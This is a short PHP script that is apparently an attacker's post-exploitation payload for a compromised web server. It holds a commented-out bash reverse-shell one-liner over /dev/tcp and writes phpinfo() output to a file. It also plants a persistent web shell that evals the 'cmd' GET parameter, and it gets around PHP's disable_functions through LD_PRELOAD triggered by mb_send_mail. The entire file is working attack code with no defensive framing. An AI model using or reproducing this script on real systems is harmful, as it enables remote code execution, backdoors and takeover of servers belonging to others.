<?php 
#`bash -c 'sh -i >& /dev/tcp/127.0.0.1/1234 0>&1'`;


#For reading phpinfo() file
ob_start();
phpinfo();
$info = ob_get_contents();
ob_end_clean();
 
$fp = fopen("phpinfo.html", "w+");
fwrite($fp, $info);
fclose($fp);


#For getting consistent php code execution
$payload = '<?php eval($_GET[\'cmd\']); ?> ';
file_put_contents("../a.php",$payload);


#For bypassing disable_function and getting RCE
rename("./exploit.txt","/tmp/exploit.txt");

chmod("/tmp/exploit.txt",0755);
putenv("LD_PRELOAD=/tmp/exploit.txt");
mb_send_mail('a','a','a','a');

?>
